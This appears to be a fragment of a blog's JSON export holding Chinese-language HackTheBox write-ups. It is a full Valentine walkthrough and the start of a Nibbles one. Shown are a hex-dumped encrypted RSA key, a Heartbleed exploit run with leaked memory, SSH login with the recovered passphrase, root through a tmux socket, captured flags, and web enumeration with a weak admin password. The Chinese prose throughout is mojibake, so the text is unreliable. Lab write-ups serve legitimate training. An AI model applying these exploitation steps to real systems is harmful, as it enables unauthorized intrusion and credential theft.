4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d\n```\nè¿™é‡Œæ‹¿åˆ°äº†ä¸€ä¸²äºŒè¿›åˆ¶ç¼–ç å’Œä¸€ä¸ªæç¤º\n\næç¤ºä¸­æš—ç¤ºæˆ‘ä»¬å¯ä»¥è§£ç è¿™å †ç¼–ç ï¼Œé‚£å°±å»è¯•è¯•å§\n\n# æ¼æ´åˆ©ç”¨\né¦–å…ˆè§£å¯†ä¸€ä¸‹è¿™å †ç¼–ç \n\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel]\nâ””â”€# curl http://10.10.10.79/dev/hype_key|xxd -r -p\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  5383  100  5383    0     0  18954      0 --:--:-- --:--:-- --:--:-- 18887\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46\n\nDbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R\n5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6\n0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi\nEbw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P\nOXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd\npHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH\nQdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E\np0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC\nOl6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO\nt9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5\nXqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK\naAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ\n+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E\nAloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q\nr08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe\n2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky\ne1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP\n09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC\ndYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX\ncY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY\npnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj\nMslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL\nsuLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW\nl0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT\nRUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3\n-----END RSA PRIVATE KEY-----\n```\nè¿™é‡Œæ‹¿åˆ°äº†ä¸€ä¸ª ssh ç§é’¥ï¼Œæ ¹æ®æ–‡ä»¶æ ¼å¼ï¼ŒçŒœæµ‹å‡ºç”¨æˆ·åæ˜¯ hypeï¼Œå»å°è¯•ç™»å½•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Valentine]\nâ””â”€# ssh hype@10.10.10.79 -i id_rsa\nThe authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.\nECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nPermissions 0644 for 'id_rsa' are too open.\nIt is required that your private key files are NOT accessible by others.\nThis private key will be ignored.\nLoad key \"id_rsa\": bad permissions\nhype@10.10.10.79's password:\n```\nç™»å½•å¤±è´¥ï¼Œå†æ‰¾æ‰¾å…¶ä»–è·¯å­\n\n## å¿ƒè„æ»´è¡€\nç”±äºæ²¡æœ‰æ€è·¯äº†ï¼Œå†å›è¿‡å¤´æ¥çœ‹çœ‹ä¹‹å‰çš„ï¼Œçœ‹ç€é¦–é¡µçš„å›¾ç‰‡ï¼Œä¼¼ä¹åƒæ˜¯å¿ƒè„æ»´è¡€ï¼Œå»æ£€æµ‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Valentine]\nâ””â”€# nmap --script=ssl-heartbleed 10.10.10.79\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-12 02:59 EDT\nNmap scan report for 10.10.10.79\nHost is up (0.24s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n| ssl-heartbleed: \n|   VULNERABLE:\n|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.\n|           \n|     References:\n|       http://www.openssl.org/news/secadv_20140407.txt \n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160\n|_      http://cvedetails.com/cve/2014-0160/\n\nNmap done: 1 IP address (1 host up) scanned in 54.59 seconds\n```\nç¡®å®å­˜åœ¨å¿ƒè„æ»´è¡€ï¼Œé‚£å°±å»åˆ©ç”¨ä¸€ä¸‹å§\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit heartbleed                                                                          \n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nOpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)                                                                               | multiple/remote/32764.py\nOpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                                                                                               | multiple/remote/32791.c\nOpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                                                                                                | multiple/remote/32998.c\nOpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                                                                                                  | multiple/remote/32745.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Paper Title                                                                                                                                                                      |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nHeartBleed Attack - Paper                                                                                                                                                         | docs/english/49313-heartbleed-at\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Valentine]\nâ””â”€# python exploit.py 10.10.10.79                                                                                                                                                                               1 â¨¯\nConnecting...\nSending Client Hello...\nWaiting for Server Hello...\n ... received message: type = 22, ver = 0302, length = 66\n ... received message: type = 22, ver = 0302, length = 885\n ... received message: type = 22, ver = 0302, length = 331\n ... received message: type = 22, ver = 0302, length = 4\nSending heartbeat request...\n ... received message: type = 24, ver = 0302, length = 16384\nReceived heartbeat response:\n  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...\n  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......\n  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....\".\n  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.\n  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................\n  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.\n  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...\n  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............\n  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................\n  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.\n  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............\n  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................\n  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................\n  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.\n  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co\n  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl\n  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo\n  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C\n  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4\n  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc\n  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld\n  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D AA  mV0aGVoeXBlCg==.\n  0160: 3E 27 75 BB 3A EF D9 09 57 8D 5F D1 F7 08 99 48  >'u.:...W._....H\n  0170: 7F 80 41 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ..A.............\n```\nè¿™é‡Œå‡ºæ¥äº†ä¸€ä¸²å¯†æ–‡\n\n```bash\naGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==\n```\nç„¶åä½¿ç”¨ä¹‹å‰æˆ‘ä»¬æ‰¾åˆ°çš„ /decode æ¥è¿›è¡Œè§£å¯†\n\n```bash\nYour input:\n\naGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==\n\nYour encoded input:\n\nheartbleedbelievethehype\n```\nå¾—åˆ°äº†ä¸€ä¸ªå¯†ç ï¼Œå†å»ç™»å½•è¯•è¯•\n\nåˆ«å¿˜äº†åŠ ä¸Šæƒé™\n\n```bash\nchmod 600 id_rsa\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Valentine]\nâ””â”€# ssh hype@10.10.10.79 -i id_rsa\nEnter passphrase for key 'id_rsa': \nWelcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com/\n\nNew release '14.04.5 LTS' available.\nRun 'do-release-upgrade' to upgrade to it.\n\nLast login: Fri Feb 16 14:50:29 2018 from 10.10.14.3\nhype@Valentine:~$ whoami&&id\nhype\nuid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)\n```\nç™»å½•æˆåŠŸ\n\n```bash\nhype@Valentine:~/Desktop$ cat user.txt \ne6710a5464769fd5fcd216e076961750\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n## Step 1\n```bash\nhype@Valentine:~/Desktop$ uname -a\nLinux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux\n```\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™å°æœºå™¨ç‰ˆæœ¬å¾ˆè€ï¼Œé‚£è‚¯å®šæ˜¯å­˜åœ¨è„ç‰›çš„ï¼Œåœ¨æµ‹è¯•ä¸­ä¹Ÿç¡®å®å¯ä»¥ä½¿ç”¨è„ç‰›ç›´æ¥ææƒï¼Œå¤§å®¶å¯ä»¥è‡ªå·±æµ‹è¯•ä¸€ä¸‹\n\n## Step 2\n```bash\nhype@Valentine:~/Desktop$ history \n    1  exit\n    2  exot\n    3  exit\n    4  ls -la\n    5  cd /\n    6  ls -la\n    7  cd .devs\n    8  ls -la\n    9  tmux -L dev_sess \n   10  tmux a -t dev_sess \n   11  tmux --help\n   12  tmux -S /.devs/dev_sess \n   13  exit\n```\næŸ¥çœ‹å†å²å‘½ä»¤ï¼Œçœ‹åˆ°å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ /.devs/dev\\_sess å»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nhype@Valentine:~/Desktop$ cd /.devs/\nhype@Valentine:/.devs$ ls -la\ntotal 8\ndrwxr-xr-x  2 root hype 4096 Apr 11 00:00 .\ndrwxr-xr-x 26 root root 4096 Feb  6  2018 ..\nsrw-rw----  1 root hype    0 Apr 11 00:00 dev_sess\nhype@Valentine:/.devs$ cat dev_sess \ncat: dev_sess: No such device or address\n```\næˆ‘ä»¬æ˜¯æ— æƒé™æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ†æä¸€ä¸‹\n\né¦–å…ˆç¬¬ 9 è¡Œä½¿ç”¨ `-L` è¿è¡Œäº†ï¼Œç„¶åç¬¬ 10 è¡Œä½¿ç”¨ `a -t` è¿è¡Œäº†ï¼Œç„¶åç¬¬ 11 è¡Œè¿˜æŸ¥çœ‹äº†å¸®åŠ©ï¼Œæ¥ç€åœ¨ç¬¬ 12 è¡Œä½¿ç”¨ `-S` è¿è¡Œåï¼Œå†è¿è¡Œäº†ä¸€ä¸ª `exit` ï¼Œé‚£æ˜¯ä¸æ˜¯æ„å‘³ç€ `-S` æˆåŠŸäº†å‘¢ï¼Ÿæˆ‘ä»¬ä¹Ÿå»å°è¯•ä¸€ä¸‹\n\n```bash\nroot@Valentine:/# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\nroot@Valentine:~# cat root.txt \nf1bb6d759df1f272914ebbc9ed7765b2\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Nibbles - Hackthebox","url":"/2022/04/09/Hackthebox/Easy/Hackthebox-Nibbles/","content":"\n# Hackthebox - Nibbles\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Nibbles/5a43dfc9-2f82-4f83-9f71-0d3ce06119c8.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Nibbles/f2f90e84-de15-4272-b261-14f07038866a.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.75\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-08 11:19 CST\nNmap scan report for 10.10.10.75\nHost is up (0.14s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/8%OT=22%CT=1%CU=33159%PV=Y%DS=2%DC=T%G=Y%TM=624FA9D0\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=2%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS(\nOS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11\nOS:NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(\nOS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT       ADDRESS\n1   139.27 ms 10.10.14.1\n2   139.49 ms 10.10.10.75\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 38.54 seconds\n```\n## Http\n![](Hackthebox-Nibbles/eeafe869-4542-42ec-b938-f7c7fdeab007.png)\n\nè¿™å°çš„ http æœåŠ¡å°±è¿™ä¹ˆç‚¹ä¸œè¥¿ï¼Œä¹Ÿæ²¡ä»€ä¹ˆç”¨å•Šï¼Œæ ¹æ®é¶æœºåå­— `å­—èŠ‚` ï¼Œå»çœ‹ä¸€ä¸‹æºç å§\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Nibbles]\nâ””â”€# curl http://10.10.10.75/\n<b>Hello world!</b>\n\n<!-- /nibbleblog/ directory. Nothing interesting here! -->\n```\nè¿™è¾¹å¯ä»¥çœ‹åˆ°ï¼ŒæŒ‚è½½äº†ä¸€ä¸ª /nibbleblog/ ç›®å½•\n\n![](Hackthebox-Nibbles/d00d3056-3248-47ab-89a5-98b8f83bdc18.png)\n\nè¿™æ‰æ˜¯çœŸå®çš„ä¸»é¡µ\n\nå¯ä»¥çœ‹åˆ°æ˜¯ Nibbleblog æ­å»ºçš„ï¼Œä½†æ˜¯é¦–é¡µæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå»fuzzä¸€ä¸‹\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel]\nâ””â”€# gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.75/nibbleblog/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/08 12:58:31 Starting gobuster in directory enumeration mode\n===============================================================\n/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]\n/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]\n/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]\n/README               (Status: 200) [Size: 4628]\n/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]\n/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]\n\n===============================================================\n2022/04/08 13:02:12 Finished\n===============================================================\n```\nè¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª README æ–‡ä»¶\n\n![](Hackthebox-Nibbles/2d35fc2f-208c-41d4-9d3d-5d92e552ae85.png)\n\né€šè¿‡ README æ–‡ä»¶ï¼Œé¦–å…ˆæˆ‘ä»¬çŸ¥é“äº†nibbleblog ä½¿ç”¨çš„ç‰ˆæœ¬ä¸º 4.0.3\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel]\nâ””â”€# curl http://10.10.10.75/nibbleblog/content/private/users.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<users><user username=\"admin\"><id type=\"integer\">0</id><session_fail_count type=\"integer\">0</session_fail_count><session_date type=\"integer\">1514544131</session_date></user><blacklist type=\"string\" ip=\"10.10.10.1\"><date type=\"integer\">1512964659</date><fail_count type=\"integer\">1</fail_count></blacklist></users>\n```\n```bash\n<users>\n<user username=\"admin\">\n<id type=\"integer\">0</id>\n<session_fail_count type=\"integer\">0</session_fail_count>\n<session_date type=\"integer\">1514544131</session_date>\n</user>\n<blacklist type=\"string\" ip=\"10.10.10.1\">\n<date type=\"integer\">1512964659</date>\n<fail_count type=\"integer\">1</fail_count>\n</blacklist>\n</users>\n```\næˆ‘ä»¬åœ¨ users.xml ä¸­çŸ¥é“äº†ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œ IP åœ°å€\n\nhttp://10.10.10.75/nibbleblog/admin.php\n\nå¹¶ä¸”æ‰¾åˆ°äº†ä¸€ä¸ªç™»å½•ç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰å¯†ç ï¼ŒNibbleblog ä¹Ÿæ²¡æœ‰é»˜è®¤å¯†ç ï¼Œæˆ‘ä»¬å»å°è¯•ä¸€ä¸‹ç™»å½•\n\næœ€åæµ‹è¯•å¼±å£ä»¤æˆåŠŸç™»å½•\n\n```bash\nusername = admin\npassword = nibbles\n```\n![](Hackthebox-Nibbles/50327381-af82-471b-adb0-d7f45744a57a.png)\n\næˆ‘ä»¬å»æœç´¢ä¸€ä¸‹æ¼æ´\n\n## Searchsploit\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Nibbles]\nâ””â”€# searchsploit Nibbleblog 4.0.3\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 